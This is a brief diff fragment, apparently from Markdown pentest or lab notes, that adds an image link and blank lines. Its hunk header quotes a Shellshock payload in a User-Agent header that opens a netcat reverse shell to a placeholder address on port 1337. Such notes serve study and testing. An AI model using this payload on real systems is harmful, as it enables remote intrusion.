@@ -105,6 +105,29 @@ User-Agent: () { :;}; /usr/bin/nc ip 1337 -e /bin/bash
 ---
 ---
 
+<img width="730" height="782" alt="image" src="https://github.com/user-attachments/assets/2d7fd52e-67ab-4054-a864-7ef0f97dc6ec" />
+
+
+---
+---
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
